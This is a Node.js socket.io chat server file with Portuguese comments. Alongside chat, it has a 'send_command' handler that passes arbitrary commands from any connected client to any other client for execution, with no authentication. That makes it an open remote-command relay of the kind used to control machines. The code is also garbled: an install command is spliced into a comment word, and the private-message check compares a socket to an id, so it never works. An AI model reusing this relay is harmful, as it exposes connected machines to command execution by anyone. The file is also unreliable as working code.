// server.js
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const clients = {};

io.on('connection', (socket) => {
  console.log(`Cliente conectado: ${socket.id}`);

  // Armazena o cliente conectado
  clients[socket.id] = socket;

  // Notifica todos sobre o novo cliente
  io.emit('message', `Cliente ${socket.id} entrou no chat.`);

  // Recebe mensagens privadas ou públicas
  socket.on('send_message', (data) => {
    const { target, message } = data;

    if (clients[target] === socket.id) {
      clients[target].emit('message', `Mensagem privada de ${socket.id}: ${message}`);
    } else {
      io.emit('message', `Cliente ${socket.id}: ${message}`);
    }
  });

  // Recebe comandos para execução
  socket.on('send_command', (data) => {
    const { target, command } = data;

    if (clients[target]) {
      clients[target].emit('execute_command', { from: socket.id, command });
    } else {
      socket.emit('message', `Cliente ${target} não encontrado.`);
    }
  });

  // Remove o clienpm install socket.io expressnte ao desconectar
  socket.on('disconnect', () => {
    console.log(`Cliente desconectado: ${socket.id}`);
    delete clients[socket.id];
    io.emit('message', `Cliente ${socket.id} saiu do chat.`);
  });
});

server.listen(3000, () => {
  console.log('Servidor rodando na porta 3000');
});
